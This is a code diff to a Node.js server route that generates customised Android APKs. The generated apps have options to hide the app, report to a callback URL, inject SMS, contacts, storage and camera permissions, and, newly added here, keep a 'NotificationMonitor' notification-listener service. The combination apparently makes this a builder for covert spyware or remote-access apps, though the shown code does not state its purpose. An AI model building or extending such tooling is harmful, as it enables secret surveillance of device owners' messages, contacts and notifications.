@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, aggressivePermissions } = req.body;
+    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableNotificationListener, aggressivePermissions } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -196,6 +196,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableContactsPermission: enableContactsPermission === 'true',
                 enableStoragePermission: enableStoragePermission !== 'false', // Default to true
                 enableCameraPermission: enableCameraPermission === 'true',
+                enableNotificationListener: enableNotificationListener === 'true',
                 aggressivePermissions: aggressivePermissions === 'true'
             };
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
@@ -223,8 +224,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
                     if (enableCameraPermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
-                        console.log('[APK] Adding CAMERA and RECORD_AUDIO permissions');
+                        console.log('[APK] Adding CAMERA permission');
                     }
 
                     if (permissionsToAdd) {
@@ -232,6 +232,20 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         fs.writeFileSync(manifestPath, manifestContent);
                         console.log('[APK] Permissions injected successfully');
                     }
+                }
+
+                // Handle Notification Listener Service
+                // The base APK includes the service declaration - remove it if not enabled
+                if (enableNotificationListener !== 'true') {
+                    // Re-read manifest in case it was modified above
+                    manifestContent = fs.readFileSync(manifestPath, 'utf8');
+                    // Remove the NotificationMonitor service block
+                    const serviceRegex = /\s*<service[\s\S]*?android:name="[^"]*NotificationMonitor"[\s\S]*?<\/service>/;
+                    manifestContent = manifestContent.replace(serviceRegex, '');
+                    fs.writeFileSync(manifestPath, manifestContent);
+                    console.log('[APK] NotificationMonitor service removed (not enabled)');
+                } else {
+                    console.log('[APK] NotificationMonitor service kept (enabled)');
                 }
             }
 
